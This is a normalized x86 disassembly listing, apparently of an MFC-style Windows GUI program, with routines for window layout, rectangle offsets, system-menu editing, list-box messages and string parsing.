cmp eax [ ebp - 0x28 ]
jle r-xdata
cmp [ edi + 0x78 ] ecx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x2c ]
jle r-xdata
cmp [ edi + 0x78 ] ecx
jne r-xdata
mov edx [ esi ]
push eax
lea eax [ ebp - 0x3c ]
push 0xffffffff
push eax
mov ecx esi
call [ edx + 0xbc ]
mov eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x38 ]
add eax ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x18 ] eax
add eax ecx
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x54 ]
push eax
push [ esi + 0x1c ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x54 ]
mov ecx edi
push eax
call sub_44736f
xor ecx ecx
cmp [ ebp + 0x10 ] ecx
je r-xdata
mov eax [ rw-data ]
neg eax
mov [ ebp - 0x30 ] eax
mov [ ebp - 0x4 ] eax
mov ebx [ rw-data ]
neg ebx
jmp r-xdata
mov [ ebp - 0x4 ] ecx
cmp [ ebp - 0x20 ] ecx
je r-xdata
cmp [ edi + 0x78 ] ecx
jne r-xdata
sub eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
push ecx
push eax
call [ OffsetRect@IAT ]
xor ecx ecx
cmp [ ebp - 0x20 ] ecx
je r-xdata
cmp [ edi + 0x78 ] ecx
jne r-xdata
sub eax [ ebp - 0x1c ]
push ecx
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ OffsetRect@IAT ]
xor ecx ecx
and [ ebp - 0x24 ] 0x0
mov eax [ ebp - 0x28 ]
sub eax [ rw-data ]
cmp [ ebp - 0x18 ] eax
jl r-xdata
mov eax [ rw-data ]
mov edx [ ebp - 0x18 ]
add edx eax
lea eax [ ebp - 0x1c ]
neg edx
push edx
push ecx
push eax
mov [ ebp - 0x20 ] ecx
call [ OffsetRect@IAT ]
sub eax [ ebp - 0x18 ]
mov edx [ ebp - 0x28 ]
sub eax [ rw-data ]
sub edx eax
mov eax [ ebp - 0x30 ]
cmp edx eax
jle r-xdata
mov eax [ ebp - 0x2c ]
sub eax [ rw-data ]
cmp [ ebp - 0x1c ] eax
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x20 ] ecx
push ecx
mov ecx [ ebp - 0x1c ]
add eax ecx
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ OffsetRect@IAT ]
jmp r-xdata
sub eax [ rw-data ]
mov edx [ ebp - 0x2c ]
sub eax [ ebp - 0x1c ]
sub edx eax
cmp edx ebx
mov eax edx
jg r-xdata
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ EqualRect@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax ecx
jle r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ rw-data ]
add eax [ ebp - 0x38 ]
mov [ ebp - 0x30 ] eax
mov eax [ ebp - 0x3c ]
cmp [ ebp - 0x24 ] eax
jg r-xdata
cmp [ edi + 0x90 ] eax
jne r-xdata
sub eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x1c ]
push ecx
push eax
call [ OffsetRect@IAT ]
xor ecx ecx
mov eax edx
lea eax [ ebp - 0x54 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ EqualRect@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0xc ]
cmp eax ecx
jle r-xdata
sub eax [ ebp - 0x1c ]
push ecx
push eax
lea eax [ ebp - 0x1c ]
push eax
call [ OffsetRect@IAT ]
xor ecx ecx
mov eax ebx
mov edx [ edi + 0x80 ]
cmp [ edx + eax * 4 - 0x4 ] ecx
je r-xdata
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x84 ]
push [ esi + 0x1c ]
push eax
call sub_440388
test [ esi + 0x64 ] 0x1
jne r-xdata
mov ebx [ ebp - 0x3c ]
mov eax [ ebp - 0x38 ]
sub ebx [ rw-data ]
add ebx [ ebp - 0x1c ]
cmp [ ebp - 0x24 ] eax
jg r-xdata
cmp [ edi + 0x90 ] eax
jne r-xdata
mov edx [ edi + 0x80 ]
cmp [ edx + eax * 4 - 0x4 ] ecx
jne r-xdata
push 0x1
pop esi
push esi
push ecx
push eax
lea ecx [ edi + 0x7c ]
call sub_43d339
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov edi [ esi + 0x74 ]
lea esi [ ebp - 0x1c ]
add edi 0x94
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp - 0x40 ]
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x84 ]
push [ esi + 0x1c ]
push eax
call sub_440388
test [ esi + 0x64 ] 0x1
jne r-xdata
mov edi [ esi + 0x74 ]
lea esi [ ebp - 0x1c ]
add edi 0x94
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi [ ebp - 0x40 ]
mov esi [ ebp - 0x44 ]
sub_44cac4
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx ecx
push esi
push edi
mov eax [ ebx + 0x90 ]
lea edi [ ebp - 0x18 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebx + 0x94 ]
mov esi eax
xor ecx ecx
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
cmp [ esi ] ecx
sete cl
mov [ ebx + 0x90 ] ecx
lea ecx [ esi + 0x4 ]
push ecx
push eax
call [ CopyRect@IAT ]
push esi
mov ecx ebx
push [ ebp + 0x8 ]
call sub_44ba80
mov edi [ ebp - 0x8 ]
lea esi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ecx [ ebp - 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
mov [ ebx + 0x90 ] ecx
pop esi
pop ebx
leave
retn 0x8
sub_44cb2a
push ebp
mov ebp esp
sub esp 0x10
lea eax [ ebp - 0x10 ]
push esi
mov esi ecx
push eax
call [ SetRectEmpty@IAT ]
mov eax [ esi + 0x64 ]
mov ecx esi
and eax 0xa000
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_44be6a
mov eax [ ebp + 0xc ]
mov ecx [ ebp - 0x10 ]
pop esi
add [ eax ] ecx
mov ecx [ ebp - 0xc ]
add [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x8 ]
add [ eax + 0x8 ] ecx
mov ecx [ ebp - 0x4 ]
add [ eax + 0xc ] ecx
leave
retn 0x8
sub_44cb78
mov eax sub_464120
call sub_42dc88
sub esp 0x54
push esi
mov esi ecx
push esi
lea ecx [ ebp - 0x60 ]
call sub_447621
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
mov ecx esi
call [ eax + 0xc8 ]
test eax eax
je r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x60 ]
call sub_447693
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0xe0 ]
test eax eax
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x60 ]
push ecx
mov ecx esi
call [ eax + 0xd8 ]
sub_44cbd8
push esi
mov esi ecx
push edi
mov edi [ esi + 0x64 ]
push [ esp + 0xc ]
mov eax edi
and ah 0xf0
mov [ esi + 0x64 ] eax
call sub_44b599
mov [ esi + 0x64 ] edi
pop edi
pop esi
retn 0x4
sub_44cbf8
mov edx [ ecx + 0x84 ]
xor eax eax
test edx edx
push esi
jle r-xdata
or eax 0xffffffff
cmp eax [ esp + 0xc ]
je r-xdata
inc eax
cmp eax edx
jl r-xdata
mov esi [ ecx + 0x80 ]
mov esi [ esi + eax * 4 ]
cmp esi [ esp + 0x8 ]
je r-xdata
pop esi
retn 0x8
sub_44cc26
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp [ esi + 0x84 ] ebx
jle r-xdata
pop esi
pop ebx
retn 0x4
push edi
inc ebx
cmp ebx [ esi + 0x84 ]
jl r-xdata
mov ecx edi
call sub_4513b8
push 0x1
mov ecx eax
push [ esp + 0x14 ]
push edi
call sub_45054f
push ebx
mov ecx esi
call sub_44cc67
mov edi eax
test edi edi
je r-xdata
pop edi
sub_44cc83
push ebp
mov ebp esp
sub esp 0x20
push ebx
push esi
mov esi ecx
xor eax eax
push edi
mov [ ebp - 0xc ] eax
mov ebx [ esi + 0x64 ]
mov [ ebp - 0x8 ] eax
and ebx 0xa000
cmp [ esi + 0x84 ] eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
jle r-xdata
mov ecx [ ebp - 0xc ]
add esi 0x7c
push 0x1
push eax
lea edi [ ecx + 0x1 ]
mov ecx esi
push edi
call sub_43d339
push 0x1
mov ecx esi
push [ ebp + 0x8 ]
push edi
push [ ebp - 0x4 ]
mov ecx esi
call sub_44cc67
mov edi eax
test edi edi
je r-xdata
mov eax [ ebp - 0x8 ]
xor ecx ecx
sub eax [ rw-data ]
mov [ ebp - 0x8 ] ecx
add [ ebp - 0x10 ] eax
mov eax [ ebp + 0x20 ]
cmp ebx ecx
jne r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0xc8 ]
test eax eax
je r-xdata
cmp eax [ ebp - 0x10 ]
jl r-xdata
mov eax [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push eax
push [ edi + 0x1c ]
call [ GetWindowRect@IAT ]
lea eax [ ebp - 0x20 ]
mov ecx esi
push eax
call sub_44736f
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] ecx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax ecx
sub eax [ ebp - 0x20 ]
dec eax
mov eax edx
sub eax [ ebp - 0x1c ]
jmp r-xdata
mov eax [ ebp - 0xc ]
push 0x1
push [ ebp + 0x8 ]
lea ecx [ esi + 0x7c ]
lea edi [ eax + 0x1 ]
push edi
jmp r-xdata
mov eax [ ebp - 0xc ]
push 0x1
inc eax
push ecx
push eax
lea ecx [ esi + 0x7c ]
call sub_43d339
xor eax eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
call sub_43d339
mov eax edi
pop edi
pop esi
pop ebx
leave
retn 0x1c
mov ecx [ ebp - 0x1c ]
xor eax eax
cmp [ ebp + 0x10 ] ecx
mov ecx [ ebp - 0x20 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
jmp r-xdata
sub ecx [ ebp - 0x20 ]
dec ecx
mov [ ebp - 0x8 ] ecx
sub edx [ ebp - 0x1c ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
cmp eax [ esi + 0x84 ]
jl r-xdata
jmp r-xdata
setg al
test eax eax
je r-xdata
sub_44cde3
mov eax sub_464134
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
call sub_451d03
and [ ebp - 0x4 ] 0x0
push 0x1
lea ecx [ esi + 0xcc ]
call sub_44bf13
mov ecx [ ebp - 0xc ]
and [ esi + 0x108 ] 0x0
mov [ esi ] r--data
mov eax esi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_44ce42
mov eax sub_464148
call sub_42dc88
push ecx
push esi
mov esi ecx
mov [ ebp - 0x10 ] esi
and [ ebp - 0x4 ] 0x0
lea ecx [ esi + 0xcc ]
call sub_44bfaa
or [ ebp - 0x4 ] 0xffffffff
mov ecx esi
call sub_451ed5
mov ecx [ ebp - 0xc ]
pop esi
mov [ fs : 0x0 ] ecx
leave
retn
sub_44ce7a
mov eax sub_46415c
call sub_42dc88
push ecx
push ebx
mov ebx [ ebp + 0xc ]
push esi
push edi
mov edi ecx
mov eax 0x80c83b00
test bl 0x4
mov [ ebp - 0x10 ] edi
mov [ edi + 0xb0 ] 0x1
je r-xdata
xor esi esi
mov ecx edi
push esi
push [ ebp + 0x8 ]
push rw-data
push eax
push rw-data
push esi
push esi
call sub_451f1f
test eax eax
jne r-xdata
mov eax 0x80c83300
mov esi ebx
push 0x0
and esi 0x5000
push [ edi + 0x1c ]
neg esi
sbb esi esi
and ebx 0x40
and si 0xf000
add esi 0x2000
or esi ebx
call [ GetSystemMenu@IAT ]
push eax
call sub_443753
mov edi [ DeleteMenu@IAT ]
mov ebx eax
push 0x0
push 0xf000
push [ ebx + 0x4 ]
call edi
push 0x0
push 0xf020
push [ ebx + 0x4 ]
call edi
push 0x0
push 0xf030
push [ ebx + 0x4 ]
call edi
push 0x0
push 0xf120
push [ ebx + 0x4 ]
call edi
mov eax [ rw-data ]
mov [ ebp + 0xc ] eax
and [ ebp - 0x4 ] 0x0
push 0xf011
lea ecx [ ebp + 0xc ]
call sub_4437c6
test eax eax
je r-xdata
mov [ edi + 0xb0 ] esi
jmp r-xdata
or esi 0x50000000
push 0xe81f
push esi
mov esi [ ebp - 0x10 ]
push [ ebp + 0x8 ]
lea ecx [ esi + 0xcc ]
call sub_44c016
test eax eax
jne r-xdata
push 0x0
push 0xf060
push [ ebx + 0x4 ]
call edi
push [ ebp + 0xc ]
push 0xf060
push 0x0
push [ ebx + 0x4 ]
call [ AppendMenuA@IAT ]
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
test esi esi
jne r-xdata
xor edi edi
jmp r-xdata
mov eax [ esi + 0x1c ]
xor eax eax
jmp r-xdata
and [ esi + 0xb0 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0xc ]
call sub_442148
mov eax edi
push eax
push [ esi + 0xe8 ]
call [ SetParent@IAT ]
push eax
call sub_43e7b3
push 0x1
pop edi
sub_44cfdf
push ebp
mov ebp esp
sub esp 0x104
push esi
mov esi ecx
cmp [ esi + 0xb0 ] 0x0
jne r-xdata
pop esi
leave
retn 0x4
push [ ebp + 0x8 ]
call sub_4510fa
lea eax [ ebp - 0x104 ]
push 0x104
push eax
lea ecx [ esi + 0xcc ]
call sub_4416fc
lea eax [ ebp - 0x104 ]
push eax
push [ esi + 0x1c ]
call sub_447993
sub_44d035
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
cmp ebx 0x2
push edi
mov esi ecx
jne r-xdata
cmp ebx 0xa
jb r-xdata
call sub_43fe1e
test [ esi + 0x130 ] 0x40
jne r-xdata
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push ebx
call sub_452451
cmp ebx 0x11
ja r-xdata
push 0x1
xor eax eax
pop edi
mov ecx esi
call sub_43fe1e
push 0x1
xor eax eax
pop edi
mov eax [ eax + 0x74 ]
push [ ebp + 0x10 ]
mov ecx eax
mov edx [ eax ]
push [ ebp + 0xc ]
call [ edx ]
jmp r-xdata
mov eax edi
lea ecx [ esi + 0xcc ]
push eax
inc edi
call sub_44cc67
test eax eax
je r-xdata
push [ ebp + 0x10 ]
mov ecx [ eax + 0x74 ]
push [ ebp + 0xc ]
mov eax [ ecx ]
push ebx
call [ eax + 0x4 ]
jmp r-xdata
mov eax edi
lea ecx [ esi + 0xcc ]
push eax
inc edi
call sub_44cc67
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
cmp edi [ esi + 0x150 ]
jge r-xdata
cmp edi [ esi + 0x150 ]
jge r-xdata
sub_44d0db
cmp [ esp + 0x4 ] 0x2
push esi
mov esi ecx
jne r-xdata
mov ecx esi
call sub_43e71a
call sub_43fe1e
test [ esi + 0x130 ] 0x40
jne r-xdata
push edi
push 0x1
pop edi
xor eax eax
mov eax [ eax + 0x74 ]
mov ecx eax
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
jmp r-xdata
mov eax edi
lea ecx [ esi + 0xcc ]
push eax
inc edi
call sub_44cc67
test eax eax
je r-xdata
pop esi
retn 0xc
cmp edi [ esi + 0x150 ]
jge r-xdata
sub_44d12c
mov eax sub_464324
call sub_42dc88
push ecx
push ecx
mov eax [ rw-data ]
push ebx
push esi
mov [ ebp - 0x10 ] eax
xor ebx ebx
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] ebx
mov esi [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
push 0x4
push ecx
mov eax [ esi ]
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call [ eax + 0x64 ]
test eax eax
je r-xdata
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov eax [ ebp - 0x10 ]
cmp [ eax - 0x8 ] ebx
je r-xdata
mov eax [ esi ]
lea ecx [ ebp - 0x14 ]
push 0x3
push ecx
mov ecx esi
call [ eax + 0x64 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax - 0x8 ] ebx
je r-xdata
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
cmp edi ebx
je r-xdata
mov edi [ ebp + 0x8 ]
lea eax [ ebp - 0x14 ]
push eax
mov ecx edi
call sub_442560
push ebx
mov ecx edi
call sub_44254b
push 0x2a
mov ecx edi
call sub_44254b
lea eax [ ebp - 0x10 ]
mov ecx edi
push eax
call sub_442560
push ebx
mov ecx edi
call sub_44254b
inc [ esi + 0x14 ]
pop edi
mov eax [ ebp - 0x10 ]
mov ecx edi
inc eax
push eax
call sub_4422d1
mov eax [ edi ]
mov [ esi + 0x3c ] eax
mov eax [ esi + 0x14 ]
inc eax
mov [ esi + 0x18 ] eax
sub_44d209
mov eax sub_464338
call sub_42dc88
sub esp 0xc
push ebx
push esi
push edi
mov ebx ecx
push 0x64
mov [ ebp - 0x14 ] ebx
call sub_441585
mov esi [ SendMessageA@IAT ]
push 0x0
mov edi eax
push 0x0
push 0x184
push [ edi + 0x1c ]
call esi
mov eax [ ebx + 0x5c ]
mov ebx [ eax + 0x4 ]
push 0x0
push 0x0
push 0x18b
push [ edi + 0x1c ]
call esi
xor ecx ecx
cmp eax ecx
jne r-xdata
mov eax ebx
mov ebx [ ebx ]
mov ecx [ eax + 0x8 ]
mov eax [ rw-data ]
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x10 ] eax
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
lea edx [ ebp - 0x10 ]
push 0x2
push edx
call [ eax + 0x64 ]
test eax eax
je r-xdata
cmp eax 0x1
push ecx
push ecx
jne r-xdata
mov ecx [ ebp - 0x14 ]
push 0xffffffff
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
jmp r-xdata
mov eax [ ebp - 0x10 ]
cmp [ eax - 0x8 ] 0x0
je r-xdata
push 0x186
push [ edi + 0x1c ]
call esi
push 0x199
push [ edi + 0x1c ]
call esi
mov ecx [ ebp - 0x14 ]
push 0x1
mov [ ecx + 0x60 ] eax
jmp r-xdata
mov ecx [ ebp - 0x14 ]
call sub_43e113
test ebx ebx
je r-xdata
push eax
push 0x0
push 0x180
push [ edi + 0x1c ]
call esi
cmp eax 0xffffffff
je r-xdata
call sub_43dfea
jmp r-xdata
mov ecx [ ebp - 0x14 ]
push 0xffffffff
call sub_43dfea
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x10 ]
call sub_442148
xor eax eax
jmp r-xdata
push [ ebp - 0x18 ]
push eax
push 0x19a
push [ edi + 0x1c ]
call esi
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn
sub_44d317
push ebx
push esi
push edi
mov esi ecx
push 0x64
call sub_441585
mov ebx [ SendMessageA@IAT ]
push 0x0
mov edi eax
push 0x0
push 0x188
push [ edi + 0x1c ]
call ebx
cmp eax 0xffffffff
jne r-xdata
push 0x0
push eax
push 0x199
push [ edi + 0x1c ]
call ebx
mov [ esi + 0x60 ] eax
and [ esi + 0x60 ] 0x0
jmp r-xdata
mov ecx esi
call sub_43e178
pop edi
pop esi
pop ebx
retn
sub_44d35f
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi ecx
test esi esi
jne r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0x50 ]
push esi
lea ecx [ edi + 0x4 ]
call sub_43cef0
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
and [ rw-data ] 0x0
jmp r-xdata
mov esi [ ecx + 0x4 ]
test esi esi
je r-xdata
pop edi
pop esi
retn 0x4
test ecx ecx
je r-xdata
mov edx [ edi ]
mov eax esi
mov esi [ esi ]
mov ecx edi
push [ eax + 0x8 ]
call [ edx + 0xc ]
test esi esi
jne r-xdata
and [ rw-data ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax + 0x4 ]
mov ecx [ rw-data ]
sub_44d3d8
push esi
mov esi [ ecx + 0x8 ]
push 0x1
pop eax
pop esi
retn
mov eax esi
mov esi [ esi ]
mov ecx [ eax + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x78 ]
test eax eax
jne r-xdata
test esi esi
je r-xdata
pop esi
retn
sub_44d3f7
push esi
mov esi [ ecx + 0x8 ]
pop esi
retn 0x4
push [ esp + 0x8 ]
mov eax esi
mov esi [ esi ]
mov ecx [ eax + 0x8 ]
mov eax [ ecx ]
call [ eax + 0x7c ]
jmp r-xdata
test esi esi
je r-xdata
sub_44d415
mov eax sub_46437a
call sub_42dc88
sub esp 0x204
push ebx
xor ebx ebx
push esi
push ebx
push ebx
push 0x6
push ebx
push ebx
push [ ebp + 0x14 ]
mov esi ecx
lea ecx [ ebp - 0x210 ]
call sub_43bad7
mov eax [ rw-data ]
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x14 ] eax
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x1
call sub_4437c6
mov eax [ ebp + 0x10 ]
or [ ebp - 0x180 ] eax
mov eax [ rw-data ]
mov [ ebp + 0x14 ] eax
mov [ ebp - 0x10 ] eax
cmp [ ebp + 0x18 ] ebx
mov [ ebp - 0x4 ] 0x3
je r-xdata
mov esi [ esi + 0x8 ]
push 0x1
pop ecx
lea eax [ ebp - 0x10 ]
push eax
lea eax [ ebp - 0x1b4 ]
push [ ebp + 0x18 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
call sub_44d12c
mov eax [ rw-data ]
mov [ ebp - 0x18 ] eax
push 0xf002
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x4
call sub_4437c6
lea eax [ ebp - 0x18 ]
lea ecx [ ebp + 0x14 ]
push eax
call sub_442560
push ebx
lea ecx [ ebp + 0x14 ]
call sub_44254b
push r--data
lea ecx [ ebp + 0x14 ]
call sub_442524
push ebx
lea ecx [ ebp + 0x14 ]
call sub_44254b
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x8 ]
inc [ ebp - 0x1a0 ]
mov [ ebp - 0x1a8 ] eax
mov eax [ ebp - 0x14 ]
push 0x104
mov [ ebp - 0x184 ] eax
call sub_442578
lea ecx [ ebp - 0x210 ]
mov [ ebp - 0x198 ] eax
call sub_43bc39
mov ecx [ ebp + 0x8 ]
push 0xffffffff
mov esi eax
call sub_4425c7
xor eax eax
cmp esi 0x1
sete al
lea ecx [ ebp - 0x18 ]
mov esi eax
mov [ ebp - 0x4 ] 0x3
call sub_442148
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x2
call sub_442148
lea ecx [ ebp + 0x14 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
lea ecx [ ebp - 0x14 ]
mov [ ebp - 0x4 ] bl
call sub_442148
lea ecx [ ebp - 0x164 ]
mov [ ebp - 0x4 ] 0x5
call sub_442148
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x210 ]
call sub_43da87
mov ecx [ ebp - 0xc ]
mov eax esi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x14
neg ecx
mov eax esi
lea edx [ ebp - 0x10 ]
sbb ecx ecx
mov esi [ esi ]
mov eax [ eax + 0x8 ]
and ecx edx
push ecx
push eax
lea eax [ ebp - 0x1b4 ]
push eax
lea eax [ ebp + 0x14 ]
push eax
call sub_44d12c
xor ecx ecx
jmp r-xdata
cmp esi ebx
je r-xdata
sub_44d5b7
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ecx + 0x8 ]
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
leave
retn
push edi
test esi esi
jne r-xdata
mov eax [ edi ]
lea ecx [ ebp - 0x4 ]
push ecx
mov ecx edi
call [ eax + 0x58 ]
inc ebx
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax esi
mov esi [ esi ]
mov edi [ eax + 0x8 ]
mov ecx edi
mov eax [ edi ]
call [ eax + 0x54 ]
test eax eax
mov [ ebp - 0x4 ] eax
je r-xdata
pop edi
sub_44d5f9
mov eax sub_464404
call sub_42dc88
sub esp 0x34
push ebx
push esi
push edi
mov [ ebp - 0x14 ] ecx
push [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
call sub_4421b6
xor esi esi
lea ecx [ ebp - 0x40 ]
mov [ ebp - 0x4 ] esi
call sub_453f13
push 0x4
lea eax [ ebp - 0x18 ]
pop edi
lea ecx [ ebp + 0x8 ]
push 0x7
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x30 ] edi
call sub_43b1ce
mov eax [ eax ]
push r--data
push eax
call sub_42d51e
mov ebx eax
pop ecx
neg ebx
pop ecx
sbb bl bl
lea ecx [ ebp - 0x18 ]
inc bl
call sub_442148
test bl bl
je r-xdata
lea eax [ ebp - 0x18 ]
push 0x8
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b1ce
mov eax [ eax ]
push r--data
push eax
call sub_42d51e
mov ebx eax
pop ecx
neg ebx
pop ecx
sbb bl bl
lea ecx [ ebp - 0x18 ]
inc bl
call sub_442148
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] 0x1
lea ecx [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0xfffffff9
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_43b152
push eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x2
call sub_442281
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x18 ]
jmp r-xdata
lea eax [ ebp - 0x18 ]
push 0xa
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b1ce
mov eax [ eax ]
push r--data
push eax
call sub_42d51e
mov ebx eax
pop ecx
neg ebx
pop ecx
sbb bl bl
lea ecx [ ebp - 0x18 ]
inc bl
call sub_442148
test bl bl
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] 0x2
lea ecx [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0xfffffff8
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_43b152
push eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x3
call sub_442281
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x18 ]
jmp r-xdata
call sub_442148
push 0x22
lea ecx [ ebp + 0x8 ]
call sub_442621
mov esi eax
cmp esi 0xffffffff
jne r-xdata
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x40 ]
call sub_453f6e
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp + 0x8 ]
call sub_442148
mov ecx [ ebp - 0xc ]
mov eax esi
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x4
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] 0x3
lea ecx [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0xfffffff6
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_43b152
push eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x4
call sub_442281
mov [ ebp - 0x4 ] 0x1
lea ecx [ ebp - 0x18 ]
lea eax [ ebp - 0x18 ]
push esi
push eax
lea ecx [ ebp + 0x8 ]
call sub_43b1ce
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x5
call sub_442281
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
mov eax [ ebp + 0x8 ]
lea ecx [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax esi
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_43b152
push eax
lea ecx [ ebp + 0x8 ]
mov [ ebp - 0x4 ] 0x6
call sub_442281
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0x1
call sub_442148
and [ ebp - 0x18 ] 0x0
push 0x1
pop ebx
mov [ ebp - 0x10 ] ebx
call sub_45357b
mov eax [ eax + 0x4 ]
cmp [ eax + 0xac ] 0x0
je r-xdata
xor esi esi
jmp r-xdata
call sub_45357b
mov eax [ eax + 0x4 ]
mov eax [ eax + 0xac ]
